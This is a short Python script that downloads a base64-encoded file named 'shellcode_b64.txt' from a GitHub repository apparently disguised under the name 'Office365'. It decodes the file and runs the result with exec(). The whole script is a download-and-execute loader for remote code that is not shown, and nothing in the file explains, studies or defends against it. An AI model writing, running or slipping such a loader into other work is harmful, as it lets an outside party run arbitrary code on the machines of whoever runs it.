import urllib.request
import base64

url = 'https://raw.githubusercontent.com/wolfgangphelan994924/Office365/main/shellcode_b64.txt'
print('Downloading from:', url)

response = urllib.request.urlopen(url)
b64_content = response.read().decode('utf-8')
print('Downloaded', len(b64_content), 'characters')

decoded = base64.b64decode(b64_content)
print('Decoded', len(decoded), 'bytes')

exec(decoded.decode('utf-8'))
